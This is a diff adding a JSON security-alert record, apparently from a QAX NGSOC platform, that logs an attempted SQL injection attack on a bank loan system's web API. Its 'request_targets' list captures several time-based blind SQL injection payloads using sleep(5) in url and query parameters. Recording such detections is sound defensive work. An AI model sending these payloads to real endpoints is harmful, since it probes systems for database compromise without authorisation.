@@ -1,0 +1,158 @@
+{
+  "meta": {
+    "schema_version": "2.0",
+    "tenant_id": "",
+    "event_id": "evt-7041f9ed6e8bc01b2267846a565f8ec81b8155782cb7816a39fd613428e818d3",
+    "occur_time": "2024-12-18T07:28:08Z",
+    "ingest_time": "2024-12-18T08:01:00Z",
+    "parse_time": "2024-12-18T08:01:00.100Z",
+    "mapping_id": "qax.ngsoc.ngsoc_alert_info.behavior.v1",
+    "data_source": {
+      "vendor": "qax",
+      "product": "ngsoc",
+      "category": "alert",
+      "instance_id": "collector-ngsoc-poc-01"
+    },
+    "source_record": {
+      "log_id": "log-ngsoc-12936305",
+      "record_kind": "finding",
+      "log_type": "ngsoc_alert_info",
+      "log_name": "NGSOC告警信息",
+      "log_level": "info"
+    }
+  },
+  "event_kind": "behavior",
+  "behavior": {
+    "layer": "network",
+    "type": "flow",
+    "operation": null,
+    "outcome": "observed",
+    "message": null
+  },
+  "subject": {
+    "ref_id": "endpoint::192.0.2.238",
+    "entity_type": "endpoint",
+    "endpoint": {
+      "ip": "192.0.2.238"
+    }
+  },
+  "object": {
+    "ref_id": "endpoint::192.0.2.146",
+    "entity_type": "endpoint",
+    "endpoint": {
+      "ip": "192.0.2.146",
+      "port": 80
+    }
+  },
+  "carriers": [],
+  "facets": {
+    "network": {
+      "direction": "L2L"
+    }
+  },
+  "observation": {
+    "observation_id": "obs-7041f9ed6e8bc01b2267846a565f8ec81b8155782cb7816a39fd613428e818d3",
+    "observer": {
+      "ref_id": "application::ngsoc",
+      "entity_type": "application",
+      "application": {
+        "name": "ngsoc",
+        "vendor": "qax"
+      }
+    },
+    "action": "detect",
+    "evidence_refs": [
+      "source_record:log-ngsoc-12936305"
+    ],
+    "assertion": {
+      "title": "SQL注入攻击",
+      "severity": "高危",
+      "rule": "1335",
+      "conclusion": null
+    }
+  },
+  "extensions": {
+    "source_private": {
+      "latest_timestamp": 1734508612000,
+      "source_ports": [
+        51518,
+        51504,
+        51492,
+        57724,
+        57750,
+        57738,
+        57728,
+        57746,
+        33204,
+        33170
+      ],
+      "request_targets": [
+        "/login?url=http://host-5c568da6.sdm.example.internal/\"and(select*from(select/**/sleep(5))a/**/union/**/select+1)=\"",
+        "/login?url=http://host-5c568da6.sdm.example.internal/'and(select*from(select/**/sleep(5))a/**/union/**/select+1)='",
+        "/login?url=http://host-5c568da6.sdm.example.internal//**/and(select*from(select+sleep(5)union/**/select+1)a)",
+        "/apis/login",
+        "/api/strategys?pageSize=10&pageNumber=1&type=2&query=123'\"and(select*from(select/**/sleep(5))a/**/union/**/select+1)=\"",
+        "/api/strategys?pageSize=10&pageNumber=1&type=2&query=123'/**/and(select*from(select+sleep(5)union/**/select+1)a)",
+        "/api/strategys?pageSize=10&pageNumber=1&type=2&query=123''and(select*from(select/**/sleep(5))a/**/union/**/select+1)='",
+        "/api/strategys/ME454286696117313536/components?pageSize=10&pageNumber=1&type=2&query=123/**/and(select*from(select+sleep(5)union/**/select+1)a)",
+        "/api/strategys/ME454286696117313536/components?pageSize=10&pageNumber=1&type=2&query=123\"and(select*from(select/**/sleep(5))a/**/union/**/select+1)=\"",
+        "/api/strategys/ME454286696117313536/components?pageSize=10&pageNumber=1&type=2&query=123'and(select*from(select/**/sleep(5))a/**/union/**/select+1)='"
+      ],
+      "relevant_log_types": [
+        "天堤网页漏洞利用日志"
+      ],
+      "relevant_asset_names": [
+        "衡阳农商行快贷系统"
+      ],
+      "relevant_asset_groups": [
+        "互联网业务区",
+        "已删除",
+        "湖南省联社"
+      ],
+      "finding": {
+        "original_id": "12936305",
+        "count": 18,
+        "confidence": "中",
+        "category": {
+          "original": {
+            "name": "SQL注入"
+          }
+        },
+        "killchain": "exploitation",
+        "attack_result": "attempted",
+        "status": "待处置",
+        "attacker": {
+          "endpoint": {
+            "ip": "192.0.2.238"
+          }
+        },
+        "victim": {
+          "endpoint": {
+            "ip": "192.0.2.146",
+            "port": 80
+          },
+          "geo": {
+            "continent": {
+              "name": "北美洲"
+            },
+            "country": {
+              "name": "美国"
+            },
+            "region": {
+              "name": "俄亥俄州"
+            },
+            "city": {
+              "name": "哥伦布"
+            },
+            "coordinates": {
+              "latitude": 39.96120071411133,
+              "longitude": -82.9988021850586
+            }
+          }
+        }
+      }
+    },
+    "profiles": {},
+    "enrichments": {}
+  }
+}
